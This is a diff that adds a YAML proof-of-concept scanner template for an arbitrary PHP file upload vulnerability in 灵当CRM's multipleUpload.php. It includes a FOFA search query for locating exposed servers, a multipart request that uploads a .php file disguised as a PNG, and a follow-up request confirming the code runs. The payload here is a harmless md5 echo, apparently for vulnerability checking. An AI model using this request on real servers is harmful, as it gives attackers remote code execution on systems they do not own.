@@ -1,0 +1,40 @@
+id: poc-yaml-51mis-crm-multipleupload-upload
+info:
+  name: 灵当CRM multipleUpload.php 文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 灵当CRM
+  fofa: body="include/js/ldAjax.js"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /crm/modules/Home/multipleUpload.php?myatt_id=1&myatt_moduel=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryj7OlOPiiukkdktZR
+  data: '------WebKitFormBoundaryj7OlOPiiukkdktZR
+
+    Content-Disposition: form-data; name="file"; filename="test{{.t1}}.php"
+
+    Content-Type: image/png
+
+
+    <?php echo md5({{.t1}});?>
+
+    ------WebKitFormBoundaryj7OlOPiiukkdktZR--
+
+    '
+  output:
+  - regex_match(body, `"path":"(?P<path>.*?)"`)
+  - set_var("path1",replace(path,"\\",""))
+  expression: "status_code == 200 && \ncontains(body,\"\\\"name\\\"\")\n"
+- method: GET
+  path: /crm/{{.path1}}test{{.t1}}.php
+  expression: 'status_code == 200 &&
+
+    body == t2
+
+    '
+transport: http
